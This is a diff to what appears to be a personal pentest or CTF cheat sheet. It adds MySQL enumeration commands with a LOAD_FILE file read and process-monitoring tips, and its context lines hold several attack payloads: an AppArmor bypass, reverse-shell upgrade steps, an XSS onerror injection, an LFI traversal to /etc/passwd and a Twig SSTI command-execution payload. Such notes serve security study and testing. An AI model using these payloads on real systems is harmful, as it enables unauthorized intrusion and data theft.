@@ -5,6 +5,7 @@ Fave Resources
 - https://swisskyrepo.github.io/PayloadsAllTheThings/
 - https://exploit-notes.hdks.org/
 - https://book.hacktricks.wiki/en/index.html
+- https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 Misc
 ------
@@ -48,6 +49,8 @@ Enumeration
 - See if there is anything the current user can run as sudo `sudo -l`
 - Look for SSH keys
 - Check if AppArmor is active. If yes, check for bypasses (Like using a kernel library to load a shell `/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash`)
+- Run pspy64 to check for running processes (Leave it running to see if any scheduled jobs are running etc.)
+- Transfer and use busybox as required to fulfil missing executables
 
 Encryption/Decryption
 ------
@@ -94,7 +97,7 @@ Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^
 1. In reverse shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 2. Press CTRL^Z to put the reverse shell in the background
 3. In the host terminal (It should be at this stage now when the reverse shell has been backgrounded) `stty raw -echo; fg`
-4. In the reverse shell that has now been foregrounded `echo TERM=xterm-256color` followed by `reset` if required
+4. In the reverse shell that has now been foregrounded `echo TERM="xterm-256color"` followed by `reset` if required
 
 
 Tunneling
@@ -176,3 +179,11 @@ eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);/
 - LFI can be tested by submitting a request similar to `/secret-script.php?file=..//..//..//..//etc//passwd`
 ### SSTI
 - On Twig version 2.14.0 or below with the sandbox mode enabled `{{['id',""]|sort('passthru')}}`
+### Databases
+#### MySQL
+- `mysql -u [USERNAME]`
+  - `show databases;`
+  - `use [DATABASE];`
+  - `show tables;`
+  - `select * from [TABLE];`
+  -	`SELECT LOAD_FILE('/home/username/myfile.txt');`
